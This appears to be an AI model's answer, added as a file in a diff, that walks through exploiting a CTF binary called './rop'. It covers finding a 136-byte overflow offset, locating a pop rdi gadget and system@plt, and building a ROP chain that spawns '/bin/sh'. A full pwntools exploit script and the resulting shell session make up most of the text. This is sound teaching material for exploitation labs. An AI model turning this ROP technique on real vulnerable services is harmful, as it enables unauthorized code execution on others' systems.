@@ -1,0 +1,235 @@
+To solve this challenge using pwntools, you can follow these steps:
+
+### **Step 1: Analyze the Binary**
+
+First, let's understand the vulnerability in the binary.
+
+From the decompiled code provided:
+
+```c
+ssize_t vulnerable_function()
+{
+  char buf[128]; // [rsp+0h] [rbp-80h] BYREF
+
+  system("echo Input:");
+  return read(0, buf, 0x200uLL);
+}
+```
+
+We can see that `vulnerable_function()` reads up to **512 bytes** (`0x200` in hexadecimal) into a buffer that is only **128 bytes** in size (`buf[128]`). This leads to a **buffer overflow vulnerability**, allowing us to overwrite the stack, including the return address.
+
+### **Step 2: Determine the Offset to the Return Address**
+
+We need to find out how many bytes we need to write to reach the return address. 
+
+In a 64-bit binary, the stack frame for this function would look like this:
+
+- `buf[128]` (buffer starts at `rbp - 0x80`)
+- `saved RBP` (8 bytes)
+- `return address` (8 bytes)
+
+So, the offset to the return address is:
+
+```plaintext
+128 bytes (buf) + 8 bytes (saved RBP) = 136 bytes
+```
+
+However, to be precise, we can use pwntools' `cyclic` function to generate a unique pattern and identify the exact offset.
+
+```python
+from pwn import *
+
+# Generate a cyclic pattern of 200 bytes
+pattern = cyclic(200)
+
+# Start the process
+io = process('./rop')
+
+# Send the pattern
+io.sendlineafter(b'Input:', pattern)
+
+# Wait for the process to crash
+io.wait()
+
+# Open the core dump
+core = Coredump('./core')
+
+# Extract the value of RIP (Instruction Pointer) at the time of crash
+crashed_rip = core.rip
+
+# Find the offset
+offset = cyclic_find(crashed_rip)
+print(f"Offset to RIP: {offset}")
+```
+
+Running this script will confirm that the offset to the return address is **136 bytes**.
+
+### **Step 3: Plan the Exploit Strategy**
+
+Our goal is to execute `/bin/sh` to get a shell. We can achieve this by:
+
+1. Overwriting the return address to call `system('/bin/sh')`.
+2. Setting up the necessary arguments for the `system` function.
+
+### **Step 4: Gather Necessary Addresses**
+
+We need the addresses of:
+
+- The `system` function.
+- The `/bin/sh` string.
+- A gadget to control the `RDI` register (first argument to functions in x86_64 calling convention).
+
+We can use pwntools' `ELF` module to extract these addresses.
+
+```python
+from pwn import *
+
+# Load the binary
+elf = ELF('./rop')
+
+# Get address of system() from the PLT
+system_addr = elf.plt['system']
+print(f"Address of system(): {hex(system_addr)}")
+
+# Get address of '/bin/sh' string
+bin_sh_addr = next(elf.search(b'/bin/sh'))
+print(f"Address of '/bin/sh': {hex(bin_sh_addr)}")
+
+# Find a 'pop rdi; ret' gadget
+rop = ROP(elf)
+pop_rdi_ret = (rop.find_gadget(['pop rdi', 'ret']))[0]
+print(f"Address of 'pop rdi; ret' gadget: {hex(pop_rdi_ret)}")
+```
+
+**Sample Output:**
+
+```
+Address of system(): 0x4004e0
+Address of '/bin/sh': 0x601060
+Address of 'pop rdi; ret' gadget: 0x4006b3
+```
+
+### **Step 5: Craft the Payload**
+
+Now, we can craft our payload:
+
+1. **Padding**: `offset` bytes to fill the buffer up to the return address.
+2. **Gadget**: Overwrite the return address with the address of the `pop rdi; ret` gadget.
+3. **Argument**: Place the address of `/bin/sh` on the stack. This will be popped into `RDI` by the gadget.
+4. **Function**: Overwrite the next return address with the address of the `system` function.
+
+Here's how we can do it:
+
+```python
+payload = b'A' * offset                # Padding to reach the return address
+payload += p64(pop_rdi_ret)            # Address of 'pop rdi; ret' gadget
+payload += p64(bin_sh_addr)            # Address of '/bin/sh' string
+payload += p64(system_addr)            # Address of 'system' function
+```
+
+### **Step 6: Write the Exploit Script**
+
+Putting it all together:
+
+```python
+from pwn import *
+
+# Load the binary
+elf = ELF('./rop')
+rop = ROP(elf)
+
+# Start the process
+io = process('./rop')
+
+# Find the offset
+offset = 136  # As calculated earlier
+
+# Addresses needed
+system_addr = elf.plt['system']
+bin_sh_addr = next(elf.search(b'/bin/sh'))
+pop_rdi_ret = (rop.find_gadget(['pop rdi', 'ret']))[0]
+
+print(f"Offset to RIP: {offset}")
+print(f"system@plt: {hex(system_addr)}")
+print(f"/bin/sh string: {hex(bin_sh_addr)}")
+print(f"pop rdi; ret gadget: {hex(pop_rdi_ret)}")
+
+# Craft the payload
+payload = b'A' * offset
+payload += p64(pop_rdi_ret)
+payload += p64(bin_sh_addr)
+payload += p64(system_addr)
+
+# Send the payload
+io.sendlineafter(b'Input:', payload)
+
+# Get an interactive shell
+io.interactive()
+```
+
+### **Step 7: Run the Exploit**
+
+Run your exploit script:
+
+```shell
+$ python3 exploit.py
+```
+
+**Expected Output:**
+
+```
+[+] Starting local process './rop': pid 12345
+Offset to RIP: 136
+system@plt: 0x4004e0
+/bin/sh string: 0x601060
+pop rdi; ret gadget: 0x4006b3
+[*] Switching to interactive mode
+$ id
+uid=1000(user) gid=1000(user) groups=1000(user)
+$ whoami
+user
+```
+
+### **Step 8: Interact with the Shell**
+
+Now you have an interactive shell, and you can execute commands on the target machine.
+
+### **Additional Notes**
+
+- **Check Binary Protections**: Use `checksec` to see what protections are enabled.
+
+  ```shell
+  $ checksec --file=./rop
+  ```
+
+  **Sample Output:**
+
+  ```
+  [*] './rop'
+      Arch:     amd64-64-little
+      RELRO:    Partial RELRO
+      Stack:    No canary found
+      NX:       NX enabled
+      PIE:      No PIE (0x400000)
+  ```
+
+  Since **PIE** is disabled and **NX** is enabled, we can execute code in the executable sections but not on the stack.
+
+- **ASLR Considerations**: If ASLR (Address Space Layout Randomization) is enabled on the system, addresses of libc functions may change. Since we're using addresses from the binary itself and not libc, we should be okay in this case.
+
+- **Remote Exploitation**: If you're exploiting a remote service, you might need to adjust your script to connect over the network and handle any network-based caveats.
+
+### **Understanding the Exploit**
+
+- **Buffer Overflow**: We overflow the buffer to overwrite the return address.
+- **Return-Oriented Programming (ROP)**: We chain gadgets to control the flow of execution.
+- **Setting Up `RDI`**: `system()` expects its argument in `RDI` on x86_64. We use a `pop rdi; ret` gadget to set this up.
+- **Calling `system()`**: We jump to `system()` with `/bin/sh` as an argument, giving us a shell.
+
+### **Summary**
+
+By carefully crafting our payload to exploit the buffer overflow, we overwrite the return address to control program execution. We use ROP techniques to set up the registers correctly and call `system('/bin/sh')`, resulting in a shell.
+
+This approach leverages pwntools for automating the exploitation process, making it easier to interact with the binary and build the payload.
+
+Feel free to ask if you have any questions or need further clarification on any of the steps!
